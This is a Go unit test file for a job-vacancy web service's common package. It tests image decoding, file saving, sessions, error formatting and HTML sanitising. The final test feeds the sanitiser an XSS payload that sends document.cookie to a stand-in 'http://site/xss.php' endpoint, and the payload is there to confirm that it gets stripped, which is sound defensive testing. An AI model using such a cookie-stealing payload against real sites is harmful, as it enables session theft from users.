package common

import (
	"encoding/base64"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/go-park-mail-ru/2020_2_MVVM.git/models/models"
	"github.com/google/uuid"
	"github.com/stretchr/testify/assert"
	"strings"
	"testing"
)

func TestGetImageFromBase64(t *testing.T) {
	testImg := fmt.Sprintf("data:image/png;base64,%s", base64.StdEncoding.EncodeToString([]byte("testImg")))
	readerNil, err := GetImageFromBase64("")
	assert.Nil(t, readerNil)
	assert.Nil(t, err)
	readerNil, err = GetImageFromBase64("testImg")
	assert.Nil(t, readerNil)
	assert.Error(t, err)
	validImgPrefix1 := fmt.Sprintf("data:%s,someImage", JpegMime)
	readerNil, err = GetImageFromBase64(validImgPrefix1)
	assert.Nil(t, readerNil)
	assert.Error(t, err)
	validImgPrefix2 := fmt.Sprintf("data:%s,someImage", PngMime)
	readerNil, err = GetImageFromBase64(validImgPrefix2)
	assert.Nil(t, readerNil)
	assert.Error(t, err)
	readerNil, err = GetImageFromBase64(testImg)
	assert.Nil(t, readerNil)
	assert.Error(t, err)
}

func TestAddOrUpdateUserFile(t *testing.T) {
	err := AddOrUpdateUserFile(nil, "someImgName")
	assert.Nil(t, err)
	err = AddOrUpdateUserFile(strings.NewReader("temp"), ".WrongPath")
	assert.Error(t, err)
}

func TestSessionGetters(t *testing.T) {
	sessionId := uuid.New()
	userId := uuid.New()
	candId := uuid.New()
	emplId := uuid.New()
	testSession := &BasicSession{SessionID: sessionId.String(), UserID: userId, EmplID: emplId, CandID: candId}
	assert.Equal(t, sessionId.String(), testSession.GetSessionID())
	assert.Equal(t, userId, testSession.GetUserID())
	assert.Equal(t, candId, testSession.GetCandID())
	assert.Equal(t, emplId, testSession.GetEmplID())
}

func TestBuild(t *testing.T) {
	gin.SetMode(gin.TestMode)
	ctx := gin.Context{}
	testSession := &BasicSession{SessionID: uuid.Nil.String()}
	session := NewSessionBuilder{}
	answerNil := session.Build(&ctx)
	ctx.Set("session", testSession)
	answer := session.Build(&ctx)
	assert.Nil(t, answerNil)
	assert.Equal(t, answer, testSession)
}

func TestErrorsRecorder(t *testing.T) {
	err := NewErr(1, "test", []string{"test"})
	js, _ := err.MarshalJSON()
	assert.Equal(t, err.code, err.Code())
	assert.Equal(t, string(js), err.String())
	assert.Equal(t, err.meta, err.Meta())
	assert.Equal(t, err.Error(), err.message)
}

func TestClearHtml(t *testing.T) {
	vac := models.Vacancy{Title: "<script>alert(1)</script>", Avatar: "aaaa", Description: "<script>var іmg = new Image(); іmg.srс = 'http://site/xss.php?' + document.cookie;іmg.srс = 'http://site/xss.php?' + document.cookie;</script> asdf"}
	clearHtml(&vac)
	assert.Equal(t, vac.Title, "")
	assert.Equal(t, vac.Description, " asdf")
	assert.Equal(t, vac.Avatar, "aaaa")
}